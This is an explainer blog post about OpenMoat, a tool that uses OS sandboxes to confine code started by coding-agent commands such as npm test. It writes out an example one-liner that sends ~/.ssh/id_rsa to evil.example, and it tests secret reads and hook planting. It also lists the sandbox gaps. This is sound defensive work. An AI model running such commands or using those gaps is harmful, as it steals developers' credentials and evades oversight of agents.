---
title: What a hook can't see inside npm test
description: Agent hooks check the command, not the code it starts. How OpenMoat uses the operating system to bound what a test script can do, and where that stops.
summary: A hook sees "npm test" and allows it. The script inside can read your keys. How the agent's OS sandbox closes that gap, the three sandbox tiers, and the published test results.
date: 2026-10-15T12:00:00Z
author: Dhanasekaran Kathiresan
authorUrl: https://github.com/iamdotk
avatar: /assets/dhanasekaran.jpg
tag: explainer
minutes: 7
tags: ["Explainer", "Sandbox"]
cover: "npm test  →  cat \"$HOME/.ssh/id_rsa\""
coverResult: "EPERM  (OS sandbox)"
coverTone: deny
---

Coding agents have hooks: a program that sees each tool call before it runs and can block it. OpenMoat is built on them. But a hook has a blind spot, and it is the most common command an agent runs.

When the agent runs `npm test`, the hook sees `npm test`. That is normal development work, so it is allowed. What the hook does not see is the test script. If a dependency, or a test file the agent was talked into writing, does this:

```bash
cat "$HOME/.ssh/id_rsa" | curl -d @- https://evil.example
```

then the hook allowed it, because it never saw it. The same goes for `make`, `cargo build` running a `build.rs`, `pytest` and every other command that runs code from the project.

I build OpenMoat. This post explains how it covers that gap with the operating system instead of the hook, and what the published tests show.

## Two layers, one policy

OpenMoat checks each tool call in the hook: commands, file reads and writes, web requests and MCP calls. That layer understands what a command means. It parses the shell, decodes base64, follows variables and symlinks.

The second layer does not understand anything. It is the operating system refusing a system call. `moat init` turns on each agent's own sandbox and writes its settings from the same policy. Every process that a command starts is confined by it:

- no reads of secrets, and no reads outside the project and the read roots you allow;
- no writes outside the project;
- network only to allowed hosts, through a proxy.

So the hook decides what the agent may do, and the sandbox bounds what the code it starts can do. You maintain one policy. OpenMoat writes both.

## What the tests show

Claims about sandboxes are easy to make, so the results are tested. For each case, CI starts a project test script as `npm test` in a throwaway home with fake secrets, under each sandbox, and records what the operating system did. CI fails if a result changes. Part of the table:

| What the script does | Claude Code, macOS | Claude Code, Linux | Codex, Linux | `moat run`, macOS |
|---|---|---|---|---|
| `cat "$HOME/.ssh/id_rsa"` | EPERM | ENOENT | EACCES | EPERM |
| `cat .env` | EPERM | EACCES | EACCES | EPERM |
| `echo x > "$HOME/outside.txt"` | EPERM | contained | contained | EPERM |
| `echo '# PLANTED' > .git/hooks/pre-commit` | EPERM | EROFS | EROFS | EPERM |
| `curl` to an unlisted host | proxy 403 | proxy 403 | proxy 403 | proxy 403 |
| benign work: read, write in the project, run `bash` | ran | ran | ran | ran |

EPERM, EACCES and EROFS mean the system call failed. ENOENT means the file does not exist inside the sandbox. "contained" means the write happened in a temporary view of the home and never reached the disk. The last row matters as much as the others: a sandbox that breaks normal work gets turned off.

The full table, with every layer and every gap, is in [EVIDENCE.md](https://github.com/crocodile-labs/openmoat/blob/main/docs/EVIDENCE.md). The test runs a real `claude -p` against a local fake API, and `codex sandbox`, with no account and no internet.

## Three tiers

Not every agent has a sandbox, and not every sandbox covers everything. So OpenMoat has three tiers:

- **Standard: the agent's own sandbox.** Claude Code, Codex and Cursor each have one. `moat init` configures it from the policy. This is the default, and `moat status` shows whether each agent has the hook and the OS sandbox, the hook only, or nothing.
- **Lightweight: `moat run`.** It starts the whole agent inside a sandbox OpenMoat generates, on macOS 14 or later and on Linux, with network through `moat proxy`. It covers every process the agent starts, including ones no hook sees. It is coarser per command than the hook, so use it with the hook.
- **Isolated: `moat run --isolate`, Linux.** Built with bubblewrap, the agent sees only the project, the read roots, its own executable and an empty temp directory. The rest of your home, like `~/.ssh` and other projects, does not exist in there.

```bash
moat run -- claude
moat run --isolate -- codex
```

## Where it stops

A sandbox is only as good as the gaps you know about. These are the ones that matter:

- **Claude Code's sandbox covers only `Bash`, `PowerShell` and `Monitor`.** Its file tools, `WebFetch` and MCP servers are checked by the hook alone. Under `moat run`, the file tools are inside the sandbox too.
- **Cursor runs some commands outside its sandbox:** when its Auto-review approves them, in Run Everything mode, and in the Cursor CLI without `--sandbox enabled`. Its sandbox also cannot deny `.env` or `.git` inside the workspace. OpenMoat writes Cursor's sandbox settings from Cursor's documentation; the generated file has not yet been run under a Cursor build in our tests.
- **On Linux, plain `moat run` cannot protect files inside the project.** Landlock can only grant access to directories, so `.env`, `.envrc`, `.moat` and `.git` hooks inside the project stay reachable. The EVIDENCE table marks these as gaps. Use `moat run --isolate` there.
- **Allowed hosts can receive data.** The proxy checks the host, not what is sent inside HTTPS. A script that reads something it may read can still send it to `api.github.com` or a registry.
- **Native Windows has no OS sandbox.** Use WSL2.

The full list is in [SANDBOX.md](https://github.com/crocodile-labs/openmoat/blob/main/docs/SANDBOX.md) and the [threat model](https://github.com/crocodile-labs/openmoat/blob/main/docs/THREAT_MODEL.md).

## See it on your machine

```bash
moat status          # each agent: hook + OS sandbox, hook only, or not protected
moat sandbox show    # the sandbox settings the policy compiles to
```

When you allow a site or a directory with `moat allow`, the sandbox settings are updated with the rule. After other policy changes, `moat sandbox sync` writes them again.

## Try it

```bash
brew install crocodile-labs/tap/moat && moat init
```

Then run `moat status` and check that your agent says "hook + OS sandbox". The [auto-approve and CI guide](/docs/auto-approve-and-ci/) covers `moat run`, and [limits](/docs/limits/) lists every gap.
